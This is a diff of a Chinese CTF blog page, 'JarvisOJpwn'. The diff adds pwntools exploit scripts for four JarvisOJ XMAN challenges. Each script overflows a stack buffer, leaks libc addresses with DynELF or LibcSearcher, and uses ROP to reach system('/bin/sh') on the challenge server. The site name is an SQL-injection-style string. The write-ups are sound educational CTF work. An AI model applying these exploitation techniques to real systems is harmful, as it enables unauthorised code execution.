@@ -22,7 +22,7 @@
     <meta name="description" content="fighting">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>JarvisOJ · hao</title>
+    <title>JarvisOJpwn · hao</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -217,7 +217,7 @@
                 <a href="/" >Ther&#39; or 1=2#</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">JarvisOJ</a>
+                <a href="#" class="post-name">JarvisOJpwn</a>
             </div>
     </div>
     
@@ -247,7 +247,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            JarvisOJ
+            JarvisOJpwn
             <!-- 404 -->
             
         </h1>
@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">503</span>阅读时长: <span class="post-count reading-time">2 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">918</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -480,6 +480,90 @@ p<span class="token punctuation">.</span>recvuntil<span class="token punctuation
 p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
 
 p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="XMAN-level4"><a href="#XMAN-level4" class="headerlink" title="[XMAN] level4"></a>[XMAN] level4</h2><p>原来以为只需要改一下level3的脚本就可以了，然后发现没有libc。</p>
+<p>DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块</p>
+<p>他可以用于寻找system函数的真实地址,有了system函数就可以将/bin/sh写入bss段，就可以执行system(‘/bin/sh’) </p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9880</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p=process('./level4')</span>
+e<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level4'</span><span class="token punctuation">)</span>
+write_plt<span class="token operator">=</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
+read_plt<span class="token operator">=</span>e<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+fun_addr<span class="token operator">=</span>e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vulnerable_function'</span><span class="token punctuation">]</span>
+bss_addr<span class="token operator">=</span><span class="token number">0x0804a024</span>
+offset<span class="token operator">=</span><span class="token number">0x88</span><span class="token operator">+</span><span class="token number">0x4</span>
+<span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span>offset<span class="token operator">+</span>p32<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+    leak_addr<span class="token operator">=</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> leak_addr
+
+d<span class="token operator">=</span>DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span>elf<span class="token operator">=</span>e<span class="token punctuation">)</span>
+sys_addr<span class="token operator">=</span>d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span><span class="token string">'libc'</span><span class="token punctuation">)</span>
+payload1<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span>offset<span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>
+
+payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span>offset<span class="token operator">+</span>p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'aaaa'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+</code></pre>
+<h2 id="XMAN-level0-x64"><a href="#XMAN-level0-x64" class="headerlink" title="[XMAN] level0_x64"></a>[XMAN] level0_x64</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9881</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p=process('./level0')</span>
+e<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level0'</span><span class="token punctuation">)</span>
+callsys<span class="token operator">=</span><span class="token number">0x400596</span>
+offset<span class="token operator">=</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token number">0x8</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span>offset<span class="token operator">+</span>p64<span class="token punctuation">(</span>callsys<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="XMAN-level2-x64"><a href="#XMAN-level2-x64" class="headerlink" title="[XMAN] level2_x64"></a>[XMAN] level2_x64</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9882</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p=process('./level2_x64')</span>
+e<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level2_x64'</span><span class="token punctuation">)</span>
+binsh_addr<span class="token operator">=</span><span class="token number">0x0000000000600a90</span>
+rdi_ret<span class="token operator">=</span><span class="token number">0x00000000004006b3</span>
+offset<span class="token operator">=</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token number">0x8</span>
+sys_addr<span class="token operator">=</span>e<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span>offset<span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'aaaa'</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="XMAN-level3-x64"><a href="#XMAN-level3-x64" class="headerlink" title="[XMAN] level3_x64"></a>[XMAN] level3_x64</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span><span class="token number">9883</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#p=process('./level3_x64')</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./level3_x64'</span><span class="token punctuation">)</span>
+write_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
+write_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"write"</span><span class="token punctuation">]</span>
+fun_addr<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'vulnerable_function'</span><span class="token punctuation">]</span>
+offset<span class="token operator">=</span><span class="token number">0x80</span><span class="token operator">+</span><span class="token number">0x8</span>
+rdi_ret<span class="token operator">=</span><span class="token number">0x4006B3</span>
+rsi_ret<span class="token operator">=</span><span class="token number">0x4006B1</span>
+
+payload1<span class="token operator">=</span>offset<span class="token operator">*</span><span class="token string">'a'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rsi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fun_addr<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#padding+两个参数：1,write_got+调用函数：write_plt+返回地址：fun_addr</span>
+<span class="token comment" spellcheck="true">#没有rdx，如果rdx>8就不需要</span>
+<span class="token comment" spellcheck="true">#d=0xdeadbeef 是赋给r15的</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+write_leak<span class="token operator">=</span>u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'write_leak={}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>write_leak<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span>write_leak<span class="token punctuation">)</span>
+libc_base<span class="token operator">=</span>write_leak<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">)</span>
+sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+binsh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
+
+payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span>offset<span class="token operator">+</span>p64<span class="token punctuation">(</span>rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Input:\n"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 
     </article>
     <!-- license  -->
@@ -487,8 +571,8 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         <div class="license-wrapper">
             <p>原文作者：<a href="https://meetl.github.io">Meetl</a>
             <p>原文链接：<a href="https://meetl.github.io/2020/01/09/JarvisOJ/">https://meetl.github.io/2020/01/09/JarvisOJ/</a>
-            <p>发表日期：<a href="https://meetl.github.io/2020/01/09/JarvisOJ/">一月 9日 2020, 9:12:29 晚上</a>
-            <p>更新日期：<a href="https://meetl.github.io/2020/01/09/JarvisOJ/">January 10th 2020, 12:35:19 am</a>
+            <p>发表日期：<a href="https://meetl.github.io/2020/01/09/JarvisOJ/">January 9th 2020, 9:12:29 pm</a>
+            <p>更新日期：<a href="https://meetl.github.io/2020/01/09/JarvisOJ/">January 10th 2020, 11:16:39 pm</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -500,8 +584,8 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href= "/2019/12/29/PWN/" title= "PWN(持续更新)">
-                    <div class="prevTitle">PWN(持续更新)</div>
+                <a href= "/2019/12/29/buuctf_pwn/" title= "BUUCTFpwn">
+                    <div class="prevTitle">BUUCTFpwn</div>
                 </a>
             
         </li>
@@ -613,7 +697,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tell-Me-Something"><span class="toc-number">1.</span> <span class="toc-text">Tell Me Something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smashes-SSP-leak"><span class="toc-number">2.</span> <span class="toc-text">Smashes(SSP leak)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level1"><span class="toc-number">3.</span> <span class="toc-text">[XMAN] level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level2"><span class="toc-number">4.</span> <span class="toc-text">[XMAN] level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level3"><span class="toc-number">5.</span> <span class="toc-text">[XMAN] level3</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Tell-Me-Something"><span class="toc-number">1.</span> <span class="toc-text">Tell Me Something</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Smashes-SSP-leak"><span class="toc-number">2.</span> <span class="toc-text">Smashes(SSP leak)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level1"><span class="toc-number">3.</span> <span class="toc-text">[XMAN] level1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level2"><span class="toc-number">4.</span> <span class="toc-text">[XMAN] level2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level3"><span class="toc-number">5.</span> <span class="toc-text">[XMAN] level3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level4"><span class="toc-number">6.</span> <span class="toc-text">[XMAN] level4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level0-x64"><span class="toc-number">7.</span> <span class="toc-text">[XMAN] level0_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level2-x64"><span class="toc-number">8.</span> <span class="toc-text">[XMAN] level2_x64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMAN-level3-x64"><span class="toc-number">9.</span> <span class="toc-text">[XMAN] level3_x64</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -626,6 +710,8 @@ top:50vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
     
     
     
@@ -706,7 +792,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/JarvisOJ/" >JarvisOJ</a>
+            <span class="archive-post-date">01/09</span><a class="archive-post-title" href= "/2020/01/09/JarvisOJ/" >JarvisOJpwn</a>
         </li>
     
     
@@ -720,7 +806,7 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2019/12/29/PWN/" >PWN(持续更新)</a>
+            <span class="archive-post-date">12/29</span><a class="archive-post-title" href= "/2019/12/29/buuctf_pwn/" >BUUCTFpwn</a>
         </li>
     
     
@@ -748,9 +834,9 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="Jarvis PWN"><span class="iconfont-archer">&#xe606;</span>Jarvis PWN</span>
-    
         <span class="sidebar-tag-name" data-tags="BUUCTF web"><span class="iconfont-archer">&#xe606;</span>BUUCTF web</span>
+    
+        <span class="sidebar-tag-name" data-tags="Jarvis PWN"><span class="iconfont-archer">&#xe606;</span>Jarvis PWN</span>
     
         <span class="sidebar-tag-name" data-tags="学习总结"><span class="iconfont-archer">&#xe606;</span>学习总结</span>
     
